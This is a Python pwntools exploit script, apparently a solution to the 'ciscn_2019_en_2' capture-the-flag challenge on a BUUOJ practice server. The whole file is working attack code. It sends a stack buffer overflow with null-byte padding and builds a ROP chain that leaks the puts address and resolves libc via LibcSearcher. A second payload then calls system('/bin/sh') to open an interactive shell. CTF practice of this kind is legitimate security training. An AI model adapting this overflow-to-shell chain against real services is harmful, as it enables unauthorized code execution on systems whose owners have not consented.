
from pwn import*
from LibcSearcher import*
elf=ELF('./ciscn_2019_en_2')
#p=process('./ciscn_2019_en_2')
p=remote('node4.buuoj.cn',25778)
context.log_level='debug'

puts_plt=elf.plt['puts']
puts_got=elf.got['puts']
pop_rdi=0x400c83
ret=0x4006b9#栈对齐
start=elf.sym['_start']

payload=b'\x00'*88
payload+=p64(pop_rdi)+p64(puts_got)+p64(puts_plt)+p64(start)
p.sendlineafter(b'choice!\n',b'1')
p.recvuntil(b'encrypted\n')
p.sendline(payload)
p.recvuntil(b'Ciphertext\n')
p.recvuntil(b'\n')
puts_addr=u64(p.recv(6).ljust(8,b'\x00'))
print(hex(puts_addr))

libc=LibcSearcher('puts',puts_addr)
libcbase=puts_addr-libc.dump('puts')
sys_addr=libcbase+libc.dump('system')
bin_sh=libcbase+libc.dump('str_bin_sh')
payload=b'\x00'*88
payload+=p64(ret)+p64(pop_rdi)+p64(bin_sh)+p64(sys_addr)
p.sendlineafter(b'choice!\n',b'1')
p.recvuntil(b'encrypted\n')
p.sendline(payload)

p.interactive()
